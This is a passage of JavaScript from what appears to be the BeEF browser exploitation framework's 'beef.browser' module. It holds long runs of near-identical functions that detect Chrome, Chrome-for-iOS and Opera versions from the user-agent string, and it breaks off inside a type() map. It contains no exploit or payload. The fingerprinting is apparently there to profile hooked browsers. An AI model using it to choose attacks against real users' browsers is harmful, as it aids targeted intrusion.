        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 20) ? true : false);
    },

    /**
     * Returns true if Chrome 21.
     * @example: beef.browser.isC21()
     */
    isC21: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 21) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 21.
     * @example: beef.browser.isC21iOS()
     */
    isC21iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 21) ? true : false);
    },

    /**
     * Returns true if Chrome 22.
     * @example: beef.browser.isC22()
     */
    isC22: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 22) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 22.
     * @example: beef.browser.isC22iOS()
     */
    isC22iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 22) ? true : false);
    },

    /**
     * Returns true if Chrome 23.
     * @example: beef.browser.isC23()
     */
    isC23: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 23) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 23.
     * @example: beef.browser.isC23iOS()
     */
    isC23iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 23) ? true : false);
    },

    /**
     * Returns true if Chrome 24.
     * @example: beef.browser.isC24()
     */
    isC24: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 24) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 24.
     * @example: beef.browser.isC24iOS()
     */
    isC24iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 24) ? true : false);
    },

    /**
     * Returns true if Chrome 25.
     * @example: beef.browser.isC25()
     */
    isC25: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 25) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 25.
     * @example: beef.browser.isC25iOS()
     */
    isC25iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 25) ? true : false);
    },

    /**
     * Returns true if Chrome 26.
     * @example: beef.browser.isC26()
     */
    isC26: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 26) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 26.
     * @example: beef.browser.isC26iOS()
     */
    isC26iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 26) ? true : false);
    },

    /**
     * Returns true if Chrome 27.
     * @example: beef.browser.isC27()
     */
    isC27: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 27) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 27.
     * @example: beef.browser.isC27iOS()
     */
    isC27iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 27) ? true : false);
    },

    /**
     * Returns true if Chrome 28.
     * @example: beef.browser.isC28()
     */
    isC28: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 28) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 28.
     * @example: beef.browser.isC28iOS()
     */
    isC28iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 28) ? true : false);
    },

    /**
     * Returns true if Chrome 29.
     * @example: beef.browser.isC29()
     */
    isC29: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 29) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 29.
     * @example: beef.browser.isC29iOS()
     */
    isC29iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 29) ? true : false);
    },

    /**
     * Returns true if Chrome 30.
     * @example: beef.browser.isC30()
     */
    isC30: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 30) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 30.
     * @example: beef.browser.isC30iOS()
     */
    isC30iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 30) ? true : false);
    },

    /**
     * Returns true if Chrome 31.
     * @example: beef.browser.isC31()
     */
    isC31: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 31) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 31.
     * @example: beef.browser.isC31iOS()
     */
    isC31iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 31) ? true : false);
    },

    /**
     * Returns true if Chrome 32.
     * @example: beef.browser.isC32()
     */
    isC32: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 32) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 32.
     * @example: beef.browser.isC32iOS()
     */
    isC32iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 32) ? true : false);
    },

    /**
     * Returns true if Chrome 33.
     * @example: beef.browser.isC33()
     */
    isC33: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 33) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 33.
     * @example: beef.browser.isC33iOS()
     */
    isC33iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 33) ? true : false);
    },

    /**
     * Returns true if Chrome 34.
     * @example: beef.browser.isC34()
     */
    isC34: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 34) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 34.
     * @example: beef.browser.isC34iOS()
     */
    isC34iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 34) ? true : false);
    },

    /**
     * Returns true if Chrome 35.
     * @example: beef.browser.isC35()
     */
    isC35: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 35) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 35.
     * @example: beef.browser.isC35iOS()
     */
    isC35iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 35) ? true : false);
    },

    /**
     * Returns true if Chrome 36.
     * @example: beef.browser.isC36()
     */
    isC36: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 36) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 36.
     * @example: beef.browser.isC36iOS()
     */
    isC36iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 36) ? true : false);
    },

    /**
     * Returns true if Chrome 37.
     * @example: beef.browser.isC37()
     */
    isC37: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 37) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 37.
     * @example: beef.browser.isC37iOS()
     */
    isC37iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 37) ? true : false);
    },

    /**
     * Returns true if Chrome 38.
     * @example: beef.browser.isC38()
     */
    isC38: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 38) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 38.
     * @example: beef.browser.isC38iOS()
     */
    isC38iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 38) ? true : false);
    },

    /**
     * Returns true if Chrome 39.
     * @example: beef.browser.isC39()
     */
    isC39: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 39) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 39.
     * @example: beef.browser.isC39iOS()
     */
    isC39iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 39) ? true : false);
    },

    /**
     * Returns true if Chrome 40.
     * @example: beef.browser.isC40()
     */
    isC40: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 40) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 40.
     * @example: beef.browser.isC40iOS()
     */
    isC40iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 40) ? true : false);
    },

    /**
     * Returns true if Chrome 41.
     * @example: beef.browser.isC41()
     */
    isC41: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 41) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 41.
     * @example: beef.browser.isC41iOS()
     */
    isC41iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 41) ? true : false);
    },

    /**
     * Returns true if Chrome 42.
     * @example: beef.browser.isC42()
     */
    isC42: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 42) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 42.
     * @example: beef.browser.isC42iOS()
     */
    isC42iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 42) ? true : false);
    },

    /**
     * Returns true if Chrome 43.
     * @example: beef.browser.isC43()
     */
    isC43: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 43) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 43.
     * @example: beef.browser.isC43iOS()
     */
    isC43iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 43) ? true : false);
    },

    /**
     * Returns true if Chrome 44.
     * @example: beef.browser.isC44()
     */
    isC44: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 44) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 44.
     * @example: beef.browser.isC44iOS()
     */
    isC44iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 44) ? true : false);
    },

    /**
     * Returns true if Chrome 45.
     * @example: beef.browser.isC45()
     */
    isC45: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 45) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 45.
     * @example: beef.browser.isC45iOS()
     */
    isC45iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 45) ? true : false);
    },

    /**
     * Returns true if Chrome 46.
     * @example: beef.browser.isC46()
     */
    isC46: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 46) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 46.
     * @example: beef.browser.isC46iOS()
     */
    isC46iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 46) ? true : false);
    },

    /**
     * Returns true if Chrome 47.
     * @example: beef.browser.isC47()
     */
    isC47: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 47) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 47.
     * @example: beef.browser.isC47iOS()
     */
    isC47iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 47) ? true : false);
    },

    /**
     * Returns true if Chrome 48.
     * @example: beef.browser.isC48()
     */
    isC48: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 48) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 48.
     * @example: beef.browser.isC48iOS()
     */
    isC48iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 48) ? true : false);
    },

    /**
     * Returns true if Chrome 49.
     * @example: beef.browser.isC49()
     */
    isC49: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 49) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 49.
     * @example: beef.browser.isC49iOS()
     */
    isC49iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 49) ? true : false);
    },

    /**
     * Returns true if Chrome 50.
     * @example: beef.browser.isC50()
     */
    isC50: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 50) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 50.
     * @example: beef.browser.isC50iOS()
     */
    isC50iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 50) ? true : false);
    },

    /**
     * Returns true if Chrome 51.
     * @example: beef.browser.isC51()
     */
    isC51: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 51) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 51.
     * @example: beef.browser.isC51iOS()
     */
    isC51iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 51) ? true : false);
    },

    /**
     * Returns true if Chrome 52.
     * @example: beef.browser.isC52()
     */
    isC52: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 52) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 52.
     * @example: beef.browser.isC52iOS()
     */
    isC52iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 52) ? true : false);
    },

    /**
     * Returns true if Chrome 53.
     * @example: beef.browser.isC53()
     */
    isC53: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 53) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 53.
     * @example: beef.browser.isC53iOS()
     */
    isC53iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 53) ? true : false);
    },

    /**
     * Returns true if Chrome 54.
     * @example: beef.browser.isC54()
     */
    isC54: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 54) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 54.
     * @example: beef.browser.isC54iOS()
     */
    isC54iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 54) ? true : false);
    },

    /**
     * Returns true if Chrome 55.
     * @example: beef.browser.isC55()
     */
    isC55: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 55) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 55.
     * @example: beef.browser.isC55iOS()
     */
    isC55iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 55) ? true : false);
    },

    /**
     * Returns true if Chrome 56.
     * @example: beef.browser.isC56()
     */
    isC56: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 56) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 56.
     * @example: beef.browser.isC56iOS()
     */
    isC56iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 56) ? true : false);
    },

    /**
     * Returns true if Chrome 57.
     * @example: beef.browser.isC57()
     */
    isC57: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 57) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 57.
     * @example: beef.browser.isC57iOS()
     */
    isC57iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 57) ? true : false);
    },

    /**
     * Returns true if Chrome 58.
     * @example: beef.browser.isC58()
     */
    isC58: function () {
        return (!!window.chrome && !!window.fetch && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 58) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 58.
     * @example: beef.browser.isC58iOS()
     */
    isC58iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 58) ? true : false);
    },

    /**
     * Returns true if Chrome.
     * @example: beef.browser.isC()
     */
    isC: function () {
        return this.isC5() || this.isC6() || this.isC7() || this.isC8() || this.isC9() || this.isC10() || this.isC11() || this.isC12() || this.isC13() || this.isC14() || this.isC15() || this.isC16() || this.isC17() || this.isC18() || this.isC19() || this.isC19iOS() || this.isC20() || this.isC20iOS() || this.isC21() || this.isC21iOS() || this.isC22() || this.isC22iOS() || this.isC23() || this.isC23iOS() || this.isC24() || this.isC24iOS() || this.isC25() || this.isC25iOS() || this.isC26() || this.isC26iOS() || this.isC27() || this.isC27iOS() || this.isC28() || this.isC28iOS() || this.isC29() || this.isC29iOS() || this.isC30() || this.isC30iOS() || this.isC31() || this.isC31iOS() || this.isC32() || this.isC32iOS() || this.isC33() || this.isC33iOS() || this.isC34() || this.isC34iOS() || this.isC35() || this.isC35iOS() || this.isC36() || this.isC36iOS() || this.isC37() || this.isC37iOS() || this.isC38() || this.isC38iOS() || this.isC39() || this.isC39iOS() || this.isC40() || this.isC40iOS() || this.isC41() || this.isC41iOS() || this.isC42() || this.isC42iOS() || this.isC43() || this.isC43iOS() || this.isC44() || this.isC44iOS() || this.isC45() || this.isC45iOS() || this.isC46() || this.isC46iOS() || this.isC47() || this.isC47iOS() || this.isC48() || this.isC48iOS() || this.isC49() || this.isC49iOS() || this.isC50() || this.isC50iOS() || this.isC51() || this.isC51iOS() || this.isC52() || this.isC52iOS() || this.isC53() || this.isC53iOS() || this.isC54() || this.isC54iOS() || this.isC55() || this.isC55iOS() || this.isC56() || this.isC56iOS() || this.isC57() || this.isC57iOS() || this.isC58() || this.isC58iOS();
    },

    /**
     * Returns true if Opera 9.50 through 9.52.
     * @example: beef.browser.isO9_52()
     */
    isO9_52: function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.5/) != null));
    },

    /**
     * Returns true if Opera 9.60 through 9.64.
     * @example: beef.browser.isO9_60()
     */
    isO9_60: function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.6/) != null));
    },

    /**
     * Returns true if Opera 10.xx.
     * @example: beef.browser.isO10()
     */
    isO10: function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.80.*Version\/10\./) != null));
    },

    /**
     * Returns true if Opera 11.xx.
     * @example: beef.browser.isO11()
     */
    isO11: function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.80.*Version\/11\./) != null));
    },

    /**
     * Returns true if Opera 12.xx.
     * @example: beef.browser.isO12()
     */
    isO12: function () {
        return (!!window.opera && (window.navigator.userAgent.match(/Opera\/9\.80.*Version\/12\./) != null));
    },

    /**
     * Returns true if Opera.
     * @example: beef.browser.isO()
     */
    isO: function () {
        return this.isO9_52() || this.isO9_60() || this.isO10() || this.isO11() || this.isO12();
    },

    /**
     * Returns a hash of string keys representing a given capability
     * @example: beef.browser.capabilities()["navigator.plugins"]
     */
    capabilities: function () {
        var out = {};
        var type = this.type();

        out["navigator.plugins"] = (type.IE11 || !type.IE);

        return out;
    },

    /**
     * Returns the type of browser being used.
     * @example: beef.browser.type().IE6
     * @example: beef.browser.type().FF
     * @example: beef.browser.type().O
     */
    type: function () {

        return {
            C5: this.isC5(), // Chrome 5
            C6: this.isC6(), // Chrome 6
            C7: this.isC7(), // Chrome 7
            C8: this.isC8(), // Chrome 8
            C9: this.isC9(), // Chrome 9
            C10: this.isC10(), // Chrome 10
            C11: this.isC11(), // Chrome 11
            C12: this.isC12(), // Chrome 12
            C13: this.isC13(), // Chrome 13
            C14: this.isC14(), // Chrome 14
            C15: this.isC15(), // Chrome 15
            C16: this.isC16(), // Chrome 16
            C17: this.isC17(), // Chrome 17
            C18: this.isC18(), // Chrome 18
            C19: this.isC19(), // Chrome 19
            C19iOS: this.isC19iOS(), // Chrome 19 on iOS
            C20: this.isC20(), // Chrome 20
            C20iOS: this.isC20iOS(), // Chrome 20 on iOS
            C21: this.isC21(), // Chrome 21
            C21iOS: this.isC21iOS(), // Chrome 21 on iOS
            C22: this.isC22(), // Chrome 22
            C22iOS: this.isC22iOS(), // Chrome 22 on iOS
            C23: this.isC23(), // Chrome 23
            C23iOS: this.isC23iOS(), // Chrome 23 on iOS
            C24: this.isC24(), // Chrome 24
            C24iOS: this.isC24iOS(), // Chrome 24 on iOS
            C25: this.isC25(), // Chrome 25
            C25iOS: this.isC25iOS(), // Chrome 25 on iOS
            C26: this.isC26(), // Chrome 26
            C26iOS: this.isC26iOS(), // Chrome 26 on iOS
            C27: this.isC27(), // Chrome 27
            C27iOS: this.isC27iOS(), // Chrome 27 on iOS
            C28: this.isC28(), // Chrome 28
            C28iOS: this.isC28iOS(), // Chrome 28 on iOS
            C29: this.isC29(), // Chrome 29
            C29iOS: this.isC29iOS(), // Chrome 29 on iOS
            C30: this.isC30(), // Chrome 30
            C30iOS: this.isC30iOS(), // Chrome 30 on iOS
            C31: this.isC31(), // Chrome 31
            C31iOS: this.isC31iOS(), // Chrome 31 on iOS
            C32: this.isC32(), // Chrome 32
            C32iOS: this.isC32iOS(), // Chrome 32 on iOS
            C33: this.isC33(), // Chrome 33
            C33iOS: this.isC33iOS(), // Chrome 33 on iOS
            C34: this.isC34(), // Chrome 34
            C34iOS: this.isC34iOS(), // Chrome 34 on iOS
            C35: this.isC35(), // Chrome 35
            C35iOS: this.isC35iOS(), // Chrome 35 on iOS
            C36: this.isC36(), // Chrome 36
            C36iOS: this.isC36iOS(), // Chrome 36 on iOS
            C37: this.isC37(), // Chrome 37
            C37iOS: this.isC37iOS(), // Chrome 37 on iOS
            C38: this.isC38(), // Chrome 38
            C38iOS: this.isC38iOS(), // Chrome 38 on iOS
            C39: this.isC39(), // Chrome 39
            C39iOS: this.isC39iOS(), // Chrome 39 on iOS
            C40: this.isC40(), // Chrome 40
            C40iOS: this.isC40iOS(), // Chrome 40 on iOS
            C41: this.isC41(), // Chrome 41
